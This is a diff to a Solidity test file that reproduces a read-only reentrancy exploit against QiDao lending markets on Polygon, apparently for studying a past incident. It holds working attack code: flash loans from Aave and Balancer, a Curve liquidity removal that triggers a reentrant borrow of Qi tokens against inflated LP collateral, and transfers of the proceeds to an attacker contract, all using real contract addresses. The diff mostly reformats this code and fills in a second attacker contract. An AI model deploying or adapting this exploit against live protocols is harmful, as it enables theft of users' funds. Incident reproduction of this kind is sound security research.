@@ -11,24 +11,14 @@ import {IERC20} from "../../interfaces/IERC20.sol";
 import {IWETH9} from "../../interfaces/IWETH9.sol";
 
 interface IUnitroller {
-    function enterMarkets(address[] memory cTokens)
-        external
-        payable
-        returns (uint256[] memory);
+    function enterMarkets(address[] memory cTokens) external payable returns (uint256[] memory);
 
     function exitMarket(address market) external;
 
     // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
     function borrowCaps(address market) external view returns (uint256);
 
-    function getAccountLiquidity(address account)
-        external
-        view
-        returns (
-            uint256,
-            uint256,
-            uint256
-        );
+    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
 }
 
 interface IPriceFeed {
@@ -68,34 +58,23 @@ interface ICERC20Delegator {
 
     function approve(address spender, uint256 amt) external;
 
-    function redeemUnderlying(uint256 redeemAmount)
-        external
-        payable
-        returns (uint256);
+    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
 }
 
 interface ICurvePool {
-    function add_liquidity(
-        uint256[2] memory amounts,
-        uint256 min_min_amount,
-        bool use_eth
-    ) external payable returns (uint256);
+    function add_liquidity(uint256[2] memory amounts, uint256 min_min_amount, bool use_eth)
+        external
+        payable
+        returns (uint256);
 
-    function remove_liquidity(
-        uint256 amount,
-        uint256[2] calldata min_amounts,
-        bool use_eth
-    ) external payable;
+    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts, bool use_eth) external payable;
 
     function token() external pure returns (address);
 
-    function exchange(
-        uint256 i,
-        uint256 j,
-        uint256 dx,
-        uint256 min_dy,
-        bool use_eth
-    ) external payable returns (uint256);
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth)
+        external
+        payable
+        returns (uint256);
 }
 
 interface IAaveFlashloan {
@@ -111,8 +90,7 @@ interface IAaveFlashloan {
 }
 
 contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
-    IAaveFlashloan aave =
-        IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
+    IAaveFlashloan aave = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
 
     // The tokens involved in the pool
     IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
@@ -121,33 +99,25 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
 
     // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
     // Curve pools.
-    ICERC20Delegator STMATIC_MATIC_DELEGATOR =
-        ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
-    IVault STMATIC_MATIC_POOL =
-        IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
+    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
 
     // QIDAO Compound delegator and underlying
-    ICERC20Delegator QIDAO_DELEGATOR =
-        ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
     IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
 
     // Unitroller and price feed used by the unitroller. The attacker does not query
     // the price (they might have precalculated the amounts) but is useful to
     // generalize the test
-    IPriceFeed PRICE_FEED =
-        IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
-    IUnitroller UNITROLLER =
-        IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
+    IPriceFeed PRICE_FEED = IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
+    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
 
     // STLidoMatic/WMATIC Curve pool
-    ICurvePool constant CURVE_STMATIC_POOL =
-        ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
-    IERC20 CURVE_STMATIC_LP_TOKEN =
-        IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
+    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
+    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
 
     // UniswapV2Router
-    IUniswapV2Router02 router =
-        IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
+    IUniswapV2Router02 router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
 
     // Let's store the price of the LP tokens in different moments of the transaction
     // To see how it goes up during the reentrancy and then comes back to normal
@@ -190,15 +160,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         uint256[] memory _arg3 = new uint256[](1);
         _arg3[0] = 0;
 
-        aave.flashLoan(
-            address(this),
-            _tokens,
-            _amounts,
-            _arg3,
-            address(this),
-            "",
-            0
-        );
+        aave.flashLoan(address(this), _tokens, _amounts, _arg3, address(this), "", 0);
     }
 
     function executeOperation(
@@ -226,26 +188,16 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         priceAtBeginning = get_lp_token_price_for_compound();
         console.log("==== INITIAL PRICE ====");
         console.log(priceAtBeginning);
-        balancer.flashLoan(
-            address(this),
-            _tokensBalancer,
-            _amountsBalancer,
-            ""
-        );
+        balancer.flashLoan(address(this), _tokensBalancer, _amountsBalancer, "");
     }
 
-    function receiveFlashLoan(
-        IERC20[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory,
-        bytes memory
-    ) external payable {
+    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory, bytes memory)
+        external
+        payable
+    {
         // Sensible requires to aid development
         require(msg.sender == address(balancer), "only callable by balancer");
-        require(
-            tokens.length == 2 && tokens.length == amounts.length,
-            "length missmatch"
-        );
+        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
         require(address(tokens[0]) == address(WMATIC));
         require(address(tokens[1]) == address(stLIDOMATIC));
 
@@ -255,22 +207,17 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         minionOne = new Attacker_Minion_One(address(this));
 
         WMATIC.transfer(address(minionOne), WMATIC.balanceOf(address(this)));
-        stLIDOMATIC.transfer(
-            address(minionOne),
-            stLIDOMATIC.balanceOf(address(this))
-        );
+        stLIDOMATIC.transfer(address(minionOne), stLIDOMATIC.balanceOf(address(this)));
 
         console.log("===== 5. Minion One begins its operations =====");
         minionOne.borrow();
 
-
         console.log("===== 6. Deploy Minion Two =====");
         minionTwo = new Attacker_Minion_Two(address(this));
+        QI_MIMATIC.transfer(address(minionTwo), 65_000e18);
     }
 
-    receive() external payable {
-
-    }
+    receive() external payable {}
 
     // =============================== HELPER FUNCTIONS ===============================
 
@@ -286,27 +233,21 @@ contract Attacker_Minion_One {
     IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
 
     // STLidoMatic/WMATIC Curve pool
-    ICurvePool constant CURVE_STMATIC_POOL =
-        ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
-    IERC20 CURVE_STMATIC_LP_TOKEN =
-        IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
+    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
+    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
 
-    ICERC20Delegator STMATIC_MATIC_DELEGATOR =
-        ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
-    IVault STMATIC_MATIC_POOL =
-        IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
+    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
 
-    IUnitroller UNITROLLER =
-        IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
+    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
 
     // QIDAO Compound delegator and underlying
-    ICERC20Delegator QIDAO_DELEGATOR =
-        ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
     IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
 
     address internal immutable ATTACKER_COMMANDER;
 
-    constructor(address _attackerCommander){
+    constructor(address _attackerCommander) {
         ATTACKER_COMMANDER = _attackerCommander;
     }
 
@@ -314,20 +255,14 @@ contract Attacker_Minion_One {
     function borrow() external {
         // Approve WMATIC and stMATIC. Well executed step as it not grants infinite allowance.
         uint256 initialWMaticBalance = WMATIC.balanceOf(address(this));
-        uint256 initialStLidoMaticBalance = stLIDOMATIC.balanceOf(
-            address(this)
-        );
+        uint256 initialStLidoMaticBalance = stLIDOMATIC.balanceOf(address(this));
 
         WMATIC.approve(address(CURVE_STMATIC_POOL), initialWMaticBalance);
-        stLIDOMATIC.approve(
-            address(CURVE_STMATIC_POOL),
-            initialStLidoMaticBalance
-        );
+        stLIDOMATIC.approve(address(CURVE_STMATIC_POOL), initialStLidoMaticBalance);
 
         // Add Liquidity to Curve Pool
-        console.log("===== 5.1 Add Liquidity to Curve =====");
-
-        CURVE_STMATIC_POOL.add_liquidity([initialWMaticBalance, initialStLidoMaticBalance], 0, false);
+        console.log("===== Add Liquidity to Curve =====");
+        CURVE_STMATIC_POOL.add_liquidity([initialStLidoMaticBalance, initialWMaticBalance], 0, false);
 
         // Enter market
         address[] memory _markets = new address[](1);
@@ -335,53 +270,66 @@ contract Attacker_Minion_One {
         UNITROLLER.enterMarkets(_markets);
 
         // Deposit and Mint
-        console.log("===== 5.2 Deposit and Mint =====");
-        CURVE_STMATIC_LP_TOKEN.approve(address(STMATIC_MATIC_POOL), 90000000000000000000000);
-        STMATIC_MATIC_POOL.deposit(90000000000000000000000);
+        console.log("===== Deposit and Mint =====");
+        CURVE_STMATIC_LP_TOKEN.approve(address(BEEFY_STMATIC), 90000000000000000000000);
+        BEEFY_STMATIC.deposit(90000000000000000000000);
 
-        uint256 stMaticBalance = STMATIC_MATIC_POOL.balanceOf(address(this));
-        STMATIC_MATIC_POOL.approve(address(STMATIC_MATIC_DELEGATOR), stMaticBalance);
+        uint256 stMaticBalance = BEEFY_STMATIC.balanceOf(address(this));
+        BEEFY_STMATIC.approve(address(STMATIC_MATIC_DELEGATOR), stMaticBalance);
         STMATIC_MATIC_DELEGATOR.mint(stMaticBalance);
 
         // Remove liquidity - by setting 'use_eth = true', it will trigger the logic inside receive().
-        console.log("===== 5.2 Deposit and Mint =====");
+        console.log("===== Deposit and Mint =====");
         uint256[2] memory minAmounts = [uint256(0), uint256(0)];
-        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, /*use_eth*/ true);
+        CURVE_STMATIC_POOL.remove_liquidity(
+            CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)),
+            minAmounts,
+            /*use_eth*/
+            true
+        );
 
-        console.log("===== 5.4 Transfer LP Token to Attacker Contract =====");
+        console.log("===== Transfer LP Token to Attacker Contract =====");
         // This step is curious since the amount transferred is zero... pseudo-automated attack?
         CURVE_STMATIC_LP_TOKEN.transfer(ATTACKER_COMMANDER, CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)));
 
-        console.log("===== 5.5 Transfer Natives to Attacker Contract =====");
-        (bool success, ) = ATTACKER_COMMANDER.call{value: address(this).balance}('');
-        require(success, 'native tx fail: Minion 1 to Commander');
+        console.log("===== Transfer Natives to Attacker Contract =====");
+        (bool success,) = ATTACKER_COMMANDER.call{value: address(this).balance}("");
+        require(success, "native tx fail: Minion 1 to Commander");
 
-        console.log("===== 5.6 Transfer WMATIC to Attacker Contract =====");
-        // Same comment as 5.4
-        WMATIC.transfer(ATTACKER_COMMANDER, WMATIC.balanceOf(address(this))); 
+        console.log("===== Transfer WMATIC to Attacker Contract =====");
+        // Same comment as before with zero amount
+        WMATIC.transfer(ATTACKER_COMMANDER, WMATIC.balanceOf(address(this)));
 
-        console.log("===== 5.7 Transfer stLIDOMATIC to Attacker Contract =====");
-        stLIDOMATIC.transfer(ATTACKER_COMMANDER, stLIDOMATIC.balanceOf(address(this))); 
+        console.log("===== Transfer stLIDOMATIC to Attacker Contract =====");
+        stLIDOMATIC.transfer(ATTACKER_COMMANDER, stLIDOMATIC.balanceOf(address(this)));
 
-        console.log("===== 5.8 Transfer Qi MiMatic to Attacker Contract =====");
-        QI_MIMATIC.transfer(ATTACKER_COMMANDER, QI_MIMATIC.balanceOf(address(this))); 
+        console.log("===== Transfer Qi MiMatic to Attacker Contract =====");
+        QI_MIMATIC.transfer(ATTACKER_COMMANDER, QI_MIMATIC.balanceOf(address(this)));
     }
 
-
     receive() external payable {
-        console.log("===== 5.3 Reentrant Call: Borrow Qi =====");
+        console.log("===== Reentrant Call: Borrow Qi =====");
         QIDAO_DELEGATOR.borrow(249000000000000000000000);
     }
 }
 
-
 contract Attacker_Minion_Two {
+    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
+    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
+
+    // STLidoMatic/WMATIC Curve pool
+    ICurvePool constant CURVE_STMATIC_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
+    IERC20 CURVE_STMATIC_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
+
+    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
+
+    ICERC20Delegator STMATIC_MATIC_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    IVault BEEFY_STMATIC = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
 
     address internal immutable ATTACKER_COMMANDER;
 
-    constructor(address _attackerCommander){
+    constructor(address _attackerCommander) {
         ATTACKER_COMMANDER = _attackerCommander;
     }
-
-
 }
